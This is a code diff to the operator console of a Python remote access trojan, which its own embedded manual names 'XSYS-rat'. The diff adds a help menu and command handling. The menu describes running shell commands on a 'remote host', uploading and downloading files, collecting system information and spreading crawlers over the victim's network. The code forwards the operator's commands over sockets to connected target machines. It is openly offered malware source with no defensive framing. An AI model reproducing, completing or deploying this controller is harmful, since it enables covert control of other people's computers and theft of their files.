@@ -266,6 +266,36 @@ class MC:
 		cls.sendTo(sock, "")
 		time.sleep(cls.INTERVAL)
 
+	# Print all the available commands to the attacker
+	def manual(cls):
+		print """
+		NAME:
+		XSYS-rat - Remote Access Trojan (ALPHA 0.0.1)
+
+		COPYRIGHT:
+		       XSYS-rat is Copyright (C) 2016-2017 by the Yahav N. Hoffman, AKA T0x1cEnv31ope
+
+		DESCRIPTION:
+			   XSYS-rat is a remote trojan which is an sh-compatibe command language 
+			   interpreter taht executes commands read from the  standard input or 
+			   from a file. XSYS-rat is also incorporate some features such as upload
+			   & download files from or to a remote host, retrieve remote host system
+			   information, encrypt or decrypt data and brodcast some crawlers ove the
+			   remote host network.
+
+		OPTIONS:
+		       In addition to the CLI provided by XSYS-rat, down below all commands
+		       available for this version
+
+		       help                :  Brings up this menu. 
+		       
+		       download <filename> :  Download a file from the remote host machine
+		       
+		       upload   <filename> :  Upload a file to the remote host machine
+		       
+		       sys_info            :  Retrieve the information of the remote host OS
+		"""
+
 
 	# connect to target machine
 	def start(cls):
@@ -332,8 +362,10 @@ class MC:
 					sys.stdout.write(data)
 					nextCmd = raw_input()
 				
+				if(nextCmd.startswith('help')):
+					cls.manual()
 				#	download -> download a file from remote host
-				if(nextCmd.startswith("download ")):
+				elif(nextCmd.startswith("download ")):
 					if(len(nextCmd.split(' ')) > 2):
 						cls.download(cls.socks[choice], nextCmd.split(' ')[1], nextCmd.split(' ')[2])
 					else:
@@ -345,7 +377,10 @@ class MC:
 						cls.download(cls.socks[choice], nextCmd.split(' ')[1], nextCmd.split(' ')[2])
 					else:
 						cls.download(cls.socks[choice], nextCmd.split(' ')[1])
-				
+				# get mashine info
+				elif(nextCmd.startswith('sys_info')):
+					cls.sendTo(cls.socks[choice], nextCmd)
+
 				#	any oter strings / commands
 				elif(nextCmd != ''):
 					cls.sendTo(cls.socks[choice], nextCmd)
